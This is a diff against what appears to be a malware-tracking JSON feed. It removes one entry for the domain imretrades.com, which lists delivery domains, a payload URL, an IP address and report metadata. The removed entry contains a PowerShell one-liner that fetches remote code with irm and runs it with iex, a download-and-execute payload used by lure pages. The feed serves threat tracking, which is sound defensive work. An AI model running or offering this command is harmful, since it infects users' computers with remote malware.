@@ -8909,26 +8909,5 @@
     ],
     "ReportId": "cmw9qc8do03h30omlv9zigk19",
     "ScannedAt": "2026-11-09T20:44:40.970000+00:00"
-  },
-  {
-    "UrlDomain": "imretrades.com",
-    "DeliveryUrl": [
-      "cloudeccentric.cc",
-      "yaponovosh.org",
-      "cosmical2049.com"
-    ],
-    "PayloadUrl": [
-      "https://cosmical2049.com/lom3/0ad7a0bdad0aa13d"
-    ],
-    "IP": [
-      "141.193.213.10"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://cosmical2049[.]com/lom3/0ad7a0bdad0aa13d' -UserAgent 'WUA/adedf1881f' -Headers @{'X-WUA'='adedf1881f'})|iex",
-    "ResolvedDownloadUrl": [
-      "https://cosmical2049.com/lom3/0ad7a0bdad0aa13d"
-    ],
-    "ReportId": "cmw9n6mj101wv0oml32xyr1jx",
-    "ScannedAt": "2026-11-09T19:16:20.516000+00:00"
   }
 ]
